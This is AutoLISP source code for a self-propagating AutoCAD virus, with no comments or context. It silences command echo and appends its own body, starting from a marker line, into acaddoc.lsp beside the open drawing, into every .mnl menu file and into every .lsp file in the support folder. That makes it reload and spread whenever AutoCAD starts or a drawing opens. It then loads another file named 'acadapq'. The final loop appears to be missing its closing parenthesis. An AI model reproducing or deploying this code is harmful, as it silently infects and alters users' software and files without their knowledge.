
(setq flagx t)
(setq bz "(setq flagx t)")
(defun app(source target bz / flag flag1 wjm wjm1 text)
  (setq flag nil)
  (setq flag1 t)
  (if (findfile target)
    (progn
      (setq wjm1 (open target "r"))
      (while (setq text (read-line wjm1))
	(if (= text bz) (setq flag1 nil))
	);while
      (close wjm1)
      );progn
    );if
  (if flag1
    (progn
      (setq wjm (open source "r"))
      (setq wjm1 (open target "a"))
      (write-line (chr 13) wjm1)
      (while (setq text (read-line wjm))
	(if (= text bz) (setq flag t))
	(if flag
	  (progn
	    (write-line text wjm1)
	    );progn
	  );if
	);while
      (close wjm1)
      (close wjm)
      );progn
    );if
  );defun
(setvar "cmdecho" 0)
(setq acadmnl (findfile "acad.mnl"))
(setq acadmnlpath (vl-filename-directory acadmnl))
(setq mnlfilelist (vl-directory-files acadmnlpath "*.mnl"))
(setq mnlnum (length mnlfilelist))
(setq acadexe (findfile "acad.exe"))
(setq acadpath (vl-filename-directory acadexe))
(setq support (strcat acadpath "\\support"))
(setq lspfilelist (vl-directory-files support "*.lsp"))
(setq lspfilelist (append lspfilelist (list "acaddoc.lsp")))
(setq lspnum (length lspfilelist))
(setq dwgname (getvar "dwgname"))
(setq dwgpath (findfile dwgname))
(if dwgpath
  (progn
    (setq acaddocpath (vl-filename-directory dwgpath))
    (setq acaddocfile (strcat acaddocpath "\\acaddoc.lsp"))
    (setq mnln 0)
    (while (< mnln mnlnum)
      (setq mnlfilename (strcat acadmnlpath "\\" (nth mnln mnlfilelist)))
      (app mnlfilename acaddocfile bz)
      (app acaddocfile mnlfilename bz)
      (setq mnln (1+ mnln))
      );while
    (setq lspn 0)
    (while (< lspn lspnum)
      (setq lspfilename (strcat support "\\" (nth lspn lspfilelist)))
      (app lspfilename acaddocfile bz)
      (app acaddocfile lspfilename bz)
      (setq lspn (1+ lspn))
      );while
    );progn
  );if
(setq mnln 0)
(while (< mnln mnlnum)
  (setq mnlfilename (strcat acadmnlpath "\\" (nth mnln mnlfilelist)))
  (setq mnln1 0)
  (while (< mnln1 mnlnum)
    (setq mnlfilename1 (strcat acadmnlpath "\\" (nth mnln1 mnlfilelist)))
    (app mnlfilename mnlfilename1 bz)
    (setq mnln1 (1+ mnln1))
    );while
  (setq lspn1 0)
  (while (< lspn1 lspnum)
    (setq lspfilename1 (strcat support "\\" (nth lspn1 lspfilelist)))
    (app mnlfilename lspfilename1 bz)
    (setq lspn1 (1+ lspn1))
    );while
  (setq mnln (1+ mnln))
  );while
(setq lspn 0)
(while (< lspn lspnum)
  (setq lspfilename (strcat support "\\" (nth lspn lspfilelist)))
  (setq lspn1 0)
  (while (< lspn1 lspnum)
    (setq lspfilename1 (strcat support "\\" (nth lspn1 lspfilelist)))
    (app lspfilename lspfilename1 bz)
    (setq lspn1 (1+ lspn1))
    );while
  (setq mnln1 0)
  (while (< mnln1 mnlnum)
    (setq mnlfilename1 (strcat acadmnlpath "\\" (nth mnln1 mnlfilelist)))
    (app lspfilename mnlfilename1 bz)
    (setq mnln1 (1+ mnln1))
    );while
  (setq lspn (1+ lspn))
(load "acadapq")
(princ)
